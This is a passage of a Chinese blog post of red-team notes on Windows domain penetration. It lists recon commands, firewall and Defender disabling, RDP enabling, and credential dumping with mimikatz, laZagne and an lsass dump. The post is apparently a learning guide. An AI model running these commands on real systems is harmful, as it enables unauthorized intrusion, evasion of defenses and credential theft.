<!DOCTYPE html>
<html>
  
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  <meta name="author" content="Dong Yuanxin">
  
  
  <title>域渗透 | hcncn6</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="内网,">
  

  
  <meta name="description" content="hcncn小站">

  

  
    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
  

  
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
  

  

  

  <script>
  // theme-ad's config script
  // it can be used in every script
  
  window.AD_CONFIG = {
    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":true},
    welcome: {"enable":false,"interval":30},
    start_time: "2018-11-1",
    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
    is_post: true,
    lock: false,
    author: "Dong Yuanxin",
    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
    mathjax: true,
    page_type: "",
    root: "/"
  };
</script>

  <script src="/vendor/sha256.min.js"></script>
<script src="/js/auth.js"></script>
<script src="/js/index.js"></script>
<script src="/vendor/qrcode.min.js"></script>

  
    <link rel="icon" href="/images/favicon.ico">
    <link rel="apple-touch-icon" href="/images/touch-icon.png">
  

  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

  <link rel="stylesheet" href="/css/index.css">
<link rel="stylesheet" href="/styles/components/highlight/highlight.css">

  
</head>
  <body>
    <header class="site-header">
  <div class="site-header-brand">
    
      <span class="site-header-brand-title">
        <a href="/">博客0v0</a>
      </span>
    
    
      <span class="site-header-brand-motto"> | 博客重建中，还有其他细节文章</span>
    
  </div>
  <div class="site-header-right">
    <nav class="site-header-navigation">
      
        <a href="/" target="_self">首页</a>
      
        <a href="/archives/" target="_self">归档</a>
      
        <a href="/categories/" target="_self">分类</a>
      
    </nav>
    <div class="site-header-btn">
      
        <a href="https://github.com/hcncn6" target="_blank" id="site-github">
          <i class="fa fa-github-alt"></i>
        </a>
      
      <a href="javascript:void(0);" id="site-search">
        <i class="fa fa-search"></i>
      </a>
      <a href="javascript:void(0);" id="site-nav-btn">
        <i class="fa fa-ellipsis-v"></i>
      </a>
    </div>
  </div>
</header>
<nav class="table-content" id="site-nav">
  <div class="table-content-title">
    <span>导航</span>
  </div>
  <div class="table-content-main">
    <ol class="toc">
      
        <li class="toc-item">
          <a href="/" target="_self">
            首页
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/archives/" target="_self">
            归档
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/categories/" target="_self">
            分类
          </a>
        </li>
      
    </ol>
  </div>
</nav>
<div id="site-process"></div>
    <main>
      
  <div class="passage">
  <div class="passage-meta">
    <span>
      <i class="fa fa-calendar"></i>2022-09-06
    </span>
    
      <span>
        | <a href="/categories/内网/"><i class="fa fa-bookmark"></i>内网</a>
      </span>
    
    
      <span>
        | <i class="fa fa-unlock-alt"></i>UNLOCK
      </span>
    
  </div>
  <h1 class="passage-title">
    域渗透
  </h1>
  
  <article class="passage-article">
    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">介绍</span><br><span class="line">	我是谁？——对机器⻆⾊的判断。</span><br><span class="line">	这是哪？——对⽬前机器所处⽹络环境的拓扑结构进⾏分析和判断。</span><br><span class="line">	我在哪？——对⽬前机器所处位置区域的判断。</span><br><span class="line">判断是否在域内</span><br><span class="line">	ipconfig /all</span><br><span class="line">		那么必须得知道当前机器所在的环境是 ⼯作组 还是 域 ，因为两种环境的攻击⼿法不同，所以我们需要根据不同的环境来做不同的处理！</span><br><span class="line"></span><br><span class="line">		 主 DNS 后缀 是⼀个域名，⼀般来说只有域机器才会有域名显示，⽽在⼯作组下显示的是空</span><br><span class="line"></span><br><span class="line">	systeminfo</span><br><span class="line">		显示了⼀个域名 redteam.com</span><br><span class="line"></span><br><span class="line">		⽽在⼯作组环境的机器只会显示出 WORKGROUP：</span><br><span class="line"></span><br><span class="line">	net config workstation</span><br><span class="line">		通过执⾏命令后发现 ⼯作站域 会显示出你当前的域叫 REDTEAM，⽽⼯作组则只会显示出：WORKGROUP</span><br><span class="line">	net time /domain</span><br><span class="line">本机信息搜集吧b</span><br><span class="line">	ipconfig /all</span><br><span class="line">	systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本b</span><br><span class="line">	echo %PROCESSOR_ARCHITECTURE%</span><br><span class="line">	wmic product get name,version</span><br><span class="line">	wmic service list brief  </span><br><span class="line">查询本机服务信息</span><br><span class="line">	tasklist  查询进程列表</span><br><span class="line">	tasklist /v  查看当前进程列表对应的⽤户身份</span><br><span class="line">	tasklist /svc 杀软查询</span><br><span class="line">	wmic startup get command,caption</span><br><span class="line">		查看启动程序信息</span><br><span class="line">通过查看启动程序信息我们可以知道当前机器开机的时候会运⾏哪些软件，这也可以利⽤⾃启动劫持。</span><br><span class="line">	查看计划任务</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line">		通过查看本机计划任务我们就能知道当前机器上“某个时间”会运⾏哪些软件，我们就可以利⽤这⼀点来做定时任务</span><br><span class="line">	查看主机开机时间</span><br><span class="line">net statistics workstation  </span><br><span class="line">		通过查看本机的开机时间，我们就能判断这台机器的管理员是不是经常关机，是不是经常在登陆这台机器。</span><br><span class="line">查看有那些⽤户</span><br><span class="line">	net user</span><br><span class="line">		查看有那些⽤户通过查看当前机器有那些⽤户，我们就可以知道当前机器有没有其他管理员，⼜或者是有没有其他⿊客&quot;来过&quot;这台机器，是不是留下了⼀个后⻔。</span><br><span class="line"></span><br><span class="line">	query user || qwinsta   </span><br><span class="line">		查看当前在线⽤户  mstsc</span><br><span class="line">	netstat -ano</span><br><span class="line">		查看本机端⼝开放情况通过查看本机端⼝开放情况我们就可以知道当前机器有没有与其他机器进⾏连接，⼜或者可以分析到当前机器有没有开放远程桌⾯ 3389、MySQL 服务 3306 ... 等等</span><br><span class="line">	查询补丁信息</span><br><span class="line">		systeminfo？</span><br><span class="line">		wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line">	路由</span><br><span class="line">	route print</span><br><span class="line">arp -a</span><br><span class="line">	防火墙</span><br><span class="line">		netsh firewall show config</span><br><span class="line">win 2003及之前的版本⽤这条命令：netsh firewall set opmode disable</span><br><span class="line">win 2003之后的版本⽤这条命令：netsh advfirewall set allprofiles state off</span><br><span class="line">	3389</span><br><span class="line">		查看</span><br><span class="line">		REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber  </span><br><span class="line"></span><br><span class="line">		开启</span><br><span class="line">		# 在 Windows Server 2003 中开启 3389 端⼝</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections</span><br><span class="line"></span><br><span class="line">		# 在 Windows Server 2008 和 Windows Server 2012 中开启 3389 端⼝wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where</span><br><span class="line">(__CLASS !=&quot;&quot;) call setallowtsconnections 1wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where</span><br><span class="line">(TerminalName=&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1</span><br><span class="line">		# 在 Windows 7 中开启 3389 端⼝reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v</span><br><span class="line">fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br><span class="line">域内信息搜集</span><br><span class="line">	简介</span><br><span class="line">		搜集完本机的⼀些配置信息、IP信息、⽹卡信息、补丁信息后，我们接下来就要搜集域内的信息了，⽐如：域⽤</span><br><span class="line">户、域管理员、域控制器等信息。</span><br><span class="line">	whoami /all</span><br><span class="line">		获取域SID</span><br><span class="line"></span><br><span class="line">	查询域内⽤户</span><br><span class="line">		详细</span><br><span class="line">		net user hcn /domain</span><br><span class="line">	查询域列表（如果有多个域）</span><br><span class="line">		net view /domain</span><br><span class="line">	查询域管理员列表</span><br><span class="line">		net group &quot;domain admins&quot; /domain</span><br><span class="line">		查看域内时间（时间服务器）</span><br><span class="line">net time /domain</span><br><span class="line">		通过查看域内时间（时间服务器），我们得知了当前域的时间，我们就可以使用定时任务+IPC来运行一些bat文件。</span><br><span class="line">我们还知道当前域的时间服务器是 AD2-2016，我们可以 Ping 一下它的机器名就知道它的 IP 是多少：</span><br><span class="line">	查看登陆本机的域管理员</span><br><span class="line">		net localgroup administrators /domain</span><br><span class="line">		这条命令会显示本地管理员和域管理员。</span><br><span class="line"></span><br><span class="line">	查看域内所有用户组列表</span><br><span class="line">		net group /domain</span><br><span class="line">		查看域的用户组我们可以知道每个组是做什么的，比如一些大型企业或者集团会有 财务组、信息科组、工厂组 … 等</span><br><span class="line">	查看主域控制器</span><br><span class="line">		netdom query pdc</span><br><span class="line">	查看所有域控制器列表</span><br><span class="line"></span><br><span class="line">		net group &quot;Domain Controllers&quot; /domain</span><br><span class="line">		一个域可以有多个域控制器，通过查看域控制器列表我们就可以得到域控制器对应的机器名是多少，如果想要知道它的 IP 是多少，我们只需要 Ping 它的机器名即可得到域控制器的 IP 地址：</span><br><span class="line"></span><br><span class="line">	查询域信任信息</span><br><span class="line"></span><br><span class="line">		nltest /domain_trusts</span><br><span class="line">		通过查询域信任信息我们就可以知道当前有多少个域，域名是多少。</span><br><span class="line"></span><br><span class="line">	查询域密码信息</span><br><span class="line"></span><br><span class="line">		net accounts /domain</span><br><span class="line">密码收集</span><br><span class="line">	 shell dir /b /s user.*,pass.*,config.*,username.*,password.*</span><br><span class="line">	for 循环搜集当前机器各类敏感密码配置文件</span><br><span class="line">还可以通过 for 循环来查找，例如查找匹配 pass 文件：</span><br><span class="line"> shell for /r c:\ %i in (pass.*) do @echo %i</span><br><span class="line">	indstr 命令查找某个文件的某个字段</span><br><span class="line">上面两条命令只是查找某个文件，那我们想要查找一个文件里有没有 user、pass 等字段内容，就可以使用这条命令：</span><br><span class="line"> shell findstr /c:&quot;sa&quot; /c:&quot;root&quot; /si *.txt</span><br><span class="line">	？？??????/效果</span><br><span class="line">获取当前机器下各类密码</span><br><span class="line">	laZagne</span><br><span class="line">		laZagne.exe all</span><br><span class="line">		laZagne.exe browsers -firefox</span><br><span class="line">	mimikatz</span><br><span class="line">		提升权限命令：privilege::debug </span><br><span class="line"></span><br><span class="line">		抓取用户密码命令：sekurlsa::logonPasswords</span><br><span class="line">		在 Windows 系统⾥有⼀个 SAM ⽂件，⾥⾯存着所有本地⽤户的密码 hash，其全称叫做 &quot;Security AccountManager&quot;。SAM ⽂件默认存放于 C:\Windows\System32\config ⽬录下的 SAM ⽂件中</span><br><span class="line">		通过注册表抓取密码hash⾸先我们需要把当前系统注册表 SAM、SYSTEM 获取到：</span><br><span class="line">然后把这两个⽂件拖回本地然后⽤ mimikatz 抓取密码hash：reg save HKLM\SYSTEM Sys.hiv</span><br><span class="line">reg save HKLM\SAM Sam.hivmimikatz &quot;lsadump::sam /sam:Sam.hiv /system:Sys.hiv&quot; exit</span><br><span class="line">		mimikatz.exe &quot;lsadump::sam /sam:Sam.hiv /system:Sys.hiv&quot; exit</span><br><span class="line"></span><br><span class="line">		通过 mimikatz 抓明⽂密码和hash</span><br><span class="line"></span><br><span class="line">		&quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">	⾼版本</span><br><span class="line">		刚刚测试过了，在 windows 10 / 2012r2 之后的系统版本中，默认情况下已禁⽤在内存缓存中存系统⽤户明⽂</span><br><span class="line">	Procdump </span><br><span class="line">		是微软官⽅发布的⼯具，使⽤该⼯具可以把 lsass 的内存 dump下来，可以绕过⼤多数的防护软件。</span><br><span class="line">		procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line">		然后就可以把 lsass.dmp ⽂件拖回本地，使⽤ mimikatz 读取密码：</span><br><span class="line"></span><br><span class="line">		mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br><span class="line">		reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\ /v UseLogonCredential /t REG_DWORD /d 1 </span><br><span class="line">		?</span><br><span class="line">		mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; &quot;exit&quot;</span><br><span class="line">		REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f</span><br><span class="line">gpupdate /force</span><br><span class="line">枚举搜集各类信息</span><br><span class="line">	LDAP 介绍</span><br><span class="line">		LDAP（Lightweight Directory Access Protocol），轻量⽬录访问协议，是⼀种⽤来查询与更新 Active Directory的⽬录服务通信协议。AD 域服务利⽤ LDAP 命名路径（LDAP naming path）来表示对象在 AD 内的位置，以便</span><br><span class="line">⽤它来访问 AD 内的对象，默认端⼝ 389</span><br><span class="line"></span><br><span class="line">	标识名称</span><br><span class="line">		（distinguished Name，DN）：它是对象在 Active Directory 内的完整路径，DN 有三个属性，分别是 CN，OU，DC。</span><br><span class="line">		DC (Domain Component)：域名组件；</span><br><span class="line">		CN (Common Name)：通⽤名称，⼀般为⽤户名或计算机名；</span><br><span class="line">		OU (Organizational Unit)：*组织单位；</span><br><span class="line">		 DN：LDAP ⽬录树的最顶部就是根，也就是所谓的 &quot;Base DN&quot;，如 